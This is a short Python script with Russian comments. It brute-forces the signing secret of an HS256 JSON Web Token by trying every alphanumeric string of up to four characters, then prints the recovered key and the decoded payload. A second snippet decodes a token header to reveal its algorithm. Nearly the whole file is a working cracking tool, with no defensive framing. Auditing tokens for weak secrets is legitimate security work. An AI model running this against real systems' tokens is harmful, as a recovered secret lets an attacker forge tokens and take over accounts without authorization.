import jwt
import itertools
import string

characters = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
max_length = 4

def brute_force_attack(encoded_token):
    ''' Функция brute force атаки на JWT токен с целью получения ключа шифрования '''
    for length in range(1, max_length + 1):
        for guess in itertools.product(characters, repeat=length):
            secret = ''.join(guess)
            try:
                payload = jwt.decode(encoded_token, secret, algorithms=["HS256"])
                print(f"Успешно подобран секретный ключ: {secret}")
                print(payload)
                return
            except jwt.InvalidTokenError:
                continue

token = "" # Поместите ваш JWT сюда
brute_force_attack(token)


# код декодирует заголовок (header) JWT-токена и выводит его в читаемом виде. Это нужно, чтобы посмотреть алгоритм шифрования.
import base64
import json

jwt_token = "" # Поместите ваш JWT сюда
header_b64 = jwt_token.split('.')[0]
header_json = base64.urlsafe_b64decode(header_b64 + "==").decode("utf-8")
print(json.loads(header_json))